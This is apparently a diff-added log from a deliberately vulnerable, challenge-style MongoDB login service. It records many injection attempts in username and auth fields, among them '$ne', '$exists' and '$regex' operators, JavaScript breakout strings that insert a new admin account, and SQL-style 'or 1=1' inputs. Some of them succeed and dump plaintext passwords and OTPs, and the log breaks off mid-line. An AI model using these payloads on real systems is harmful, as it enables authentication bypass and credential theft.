+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin"});//', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin"});//', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin'});//", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'"});db.login.insert({username:\'admin\',auth:{password:\'admin\',otp:\'1234\'}});//', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'{"$exists":true}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'{"$exists":true}'}}
+None
+Query: {'username': u'admin"});', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin"});', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'{"$exists":true}'}}
+None
+Query: {'username': u'username=admin&auth={"$exists":true}', 'auth': {u'otp': u'', u'password': u'{"$exists":true}'}}
+None
+Query: {'username': u'username=admin&auth={"$exists":true}', 'auth': {u'otp': u'123', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin&auth={"$exists":true}', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin&auth={"$exists":true}', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin&auth={"$exists":true}', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'\xe1dmin', u'password': u'admin'}}
+None
+Query: {'username': u'auth={"$exists":true}', 'auth': {u'otp': u'\xe1dmin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'%'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'/.*/ ', u'password': u'%'}}
+None
+Query: {'username': u'123', 'auth': {u'otp': u'123', u'password': u'1231'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'/.*/'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'%'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'*'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:1}', u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:1}', u'password': u'{$ne1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': 1, u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': 1, u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:1}', u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:1}', u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': {u'$ne': 1}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': 1}, u'password': {u'$ne': 1}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$ne': 1}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': {u'$ne': u'1'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'1'}, u'password': {u'$ne': u'1'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'1'}, u'password': {u'$ne': u'1'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'1'}, u'password': {u'$ne': u'1'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'1aaaaaaaaa'}, u'password': {u'$ne': u'1aaaaaaaaa'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'1'}, u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'1'}, u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'1'}, u'password': u'1'}}
+None
+Query: {'username': u'//', 'auth': {u'otp': u'//', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'//', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'//', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'//', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': u'//'}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'//', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'//', u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'//', u'password': u'/1/'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'/1/', u'password': u'/1/'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"} #', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"} //', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"} #', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"} #', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"} #', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"} #', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"} #', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'"admin"}; #', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin"}, { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] }', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin"}, { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] }', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin"}, { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] }', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin"}, { $or : [ { a : 1 } , { b : 2 }, { c : /.*/ } ] }', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'$not': [{u'otp': u'admin', u'password': u'admin'}]}}
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:"admin"}', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:"admin"}', u'password': u'{$ne:"admin"}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:"admin"}', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:"admin"}', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp[$ne]': u'admin', u'password[$ne]': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'{$ne:admin}', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'{$ne:"admin"}', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:1}', u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': {u'$ne': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': u'password{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'9cdb629b42e9353a'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'a1a3376c1730c29be839f6705e2cf839'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'admin'}, u'password': u'{$ne:1}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'1', 'auth': {u'otp': u'1', u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'{$ne:1}', u'password': u'{ $ne: "admin" }'}}
+None
+Query: {'username': u"admin')}//", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin')}//", 'auth': {u'otp': u'', u'password': u"admin')}//"}}
+None
+Query: {'username': u'ab', 'auth': {u'otp': u'123', u'password': u'def'}}
+None
+Query: {'username': u'ab', 'auth': {u'$ne': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': 1}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'fsd', 'auth': {u'otp': u'54', u'password': u'qds'}}
+None
+Query: {'username': u'fsd', 'auth': {u'$ne': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u''}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'asda', 'auth': {u'otp': u'1234', u'password': u'dasad'}}
+None
+Query: {'username': u'asda', 'auth': {u'otp': u'1234', u'password': u'dasad'}}
+None
+Query: {'username': u'asda', 'auth': {}}
+None
+Query: {'username': u'guest', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'password': u"admin' or 1=1 -- "}}
+None
+Query: {'username': u'admin', 'auth': {u'': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'_id': u'_id'}}
+None
+Query: {'username': u'admin', 'auth': {u'_id': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'$username': u'.*'}}
+Query: {'username': u'admin', 'auth': {u'username': u'.*'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'.*'}}
+None
+Query: {'username': u'admin', 'auth': {u'password': u'.*'}}
+None
+Query: {'username': u'admin', 'auth': {u'$password': u'.*'}}
+Query: {'username': u'admin', 'auth': {u'otp': {u'$regex': u'.*'}, u'password': {u'$regex': u'.*'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$regex': u'.*'}, u'password': {u'$regex': u'.*'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$regex': u'.*'}, u'password': {u'$regex': u'.*'}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$regex': u'.*'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$regex': u'.*'}, u'password': {u'$regex': u'.*'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$regex': u'^'}, u'password': {u'$regex': u'^'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$regex': u'^'}, u'password': {u'$regex': u'^'}}}
+None
+Query: {'username': u'admin', 'auth': {u'$regex': u'^'}}
+None
+Query: {'username': u'admin', 'auth': {u'$regex': u'.*'}}
+None
+Query: {'username': u'admin', 'auth': {u'$regex': u'^.*'}}
+None
+Query: {'username': u'admin', 'auth': {u'$regex': u'^.*'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$regex': u'^'}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$exists': True}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$exists': True}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': {u'$exists': True}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$exists': True}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'{"$exists":true}', 'auth': {u'otp': {u'$exists': True}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'{"$exists":true}', 'auth': {u'otp': {u'$exists': True}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'{"$exists":true}', 'auth': {u'otp': {u'$exists': True}, u'password': {u'$exists': True}}}
+None
+Query: {'username': u'{"$exists":true}', 'auth': {u'$exists': True}}
+None
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'asda', 'auth': {u'otp': u'1234', u'password': u'dasad'}}
+None
+Query: {'username': u'2', 'auth': {u'otp': u'22', u'password': u'2'}}
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+Query: {'username': u'asda', 'auth': {u'otp': u'', u'password': u''}}
+Query: {'username': u'abc', 'auth': {u'otp': u'123', u'password': u'def'}}
+Query: {'username': u'abc', 'auth': {u'otp': u'123', u'password': u'def'}}
+None
+Query: {'username': u'abc', 'auth': {u'otp': u'1', u'password': u'def'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': 1337}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'$ne': 1}}
+{u'username': u'guest', u'_id': ObjectId('52cefa94a00b44346514ba6a'), u'email': u'guest@guest.com', u'auth': [{u'OTP': u'123456', u'password': u'guest'}]}
+Query: {'username': u'guest', 'auth': {u'otp': {u'$ne': 1}, u'password': {u'$ne': 1}}}
+None
+Query: {'username': u'guest', 'auth': {u'$ne': 1}}
+{u'username': u'guest', u'_id': ObjectId('52cefa94a00b44346514ba6a'), u'email': u'guest@guest.com', u'auth': [{u'OTP': u'123456', u'password': u'guest'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': 1}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'guest', 'auth': {u'$ne': 1}}
+{u'username': u'guest', u'_id': ObjectId('52cefa94a00b44346514ba6a'), u'email': u'guest@guest.com', u'auth': [{u'OTP': u'123456', u'password': u'guest'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': 1}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'1', 'auth': {u'otp': u'', u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': 100}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'\u201c$ne\u201d:1337', u'password': u''}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'123'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"' or 1=1-- -"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'aaa', 'auth': {u'otp': u'aaa', u'password': u'aaa'}}
+None
+Query: {'username': u'aaa', 'auth': {u'$ne': 1337}}
+None
+Query: {'username': u'aaa', 'auth': {u'$ne': 1337}}
+None
+Query: {'username': u'aaa', 'auth': {u'$ne': 1337}}
+None
+Query: {'username': u'aaa', 'auth': {u'$ne': 1337}}
+None
+Query: {'username': u'aaa', 'auth': {u'$ne': 1337}}
+None
+Query: {'username': u'aaa', 'auth': {u'$ne': 1337}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': 1337}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': 1337}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': 1337}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin&auth={\u201c$ne\u201d:1337}', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'asd'}}
+None
+Query: {'username': u'admin&auth={\u201c$ne\u201d:1337}', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin&auth={\u201c$ne\u201d:1337}', 'auth': {u'otp': u'', u'password': u'abc'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'def', u'password': u'abc'}}
+None
+Query: {'username': u'ad
